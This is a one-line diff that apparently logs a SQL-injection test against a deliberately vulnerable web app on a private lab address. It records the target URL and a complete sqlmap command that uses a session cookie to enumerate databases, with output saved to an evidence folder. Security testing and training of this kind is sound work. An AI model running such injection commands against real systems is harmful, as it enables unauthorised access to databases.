@@ -1,0 +1,1 @@
+http://10.40.0.10/vulnerabilities/sqli/?id=1&Submit=Submit (GET)  # /usr/bin/sqlmap -u http://10.40.0.10/vulnerabilities/sqli/?id=1&Submit=Submit "--cookie=security=low; PHPSESSID=c6u4vqlgokk81hqf4ke8630303" -p id --dbms=mysql --batch --dbs --output-dir=/data/preuves
